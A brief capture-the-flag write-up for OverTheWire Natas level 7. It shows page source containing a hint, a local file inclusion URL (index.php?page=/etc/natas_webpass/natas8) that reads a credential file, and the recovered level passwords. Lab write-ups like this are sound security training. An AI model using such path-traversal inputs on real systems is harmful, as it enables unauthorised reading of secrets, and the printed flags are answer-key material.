# Natas Level 6 → Level 7 File inclusion Vulnerability from path traversal

## Previous Flag
<b>bmg8SvU1LizuWjx3y7xkNERkHxGre0GS</b>

## Goal
Username: natas7<br>
URL: http://natas7.natas.labs.overthewire.org<br>

## What I learned
```
Nothing
```

## Solution
```
F12 → Elements

<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --> 👀
</div>

<div id="wechallform" class="ui-draggable" style="display: block;"><p>Submit token</p><form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post"><input type="hidden" name="wfid" value="8"><input type="hidden" name="password_solution" value="bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"><input type="hidden" name="igotitnow" value="Register"></form></div></body>

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 🔐
```

## Flag
<b>xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q</b>

## Continue
[Continue](/overthewire/Natas0708.md)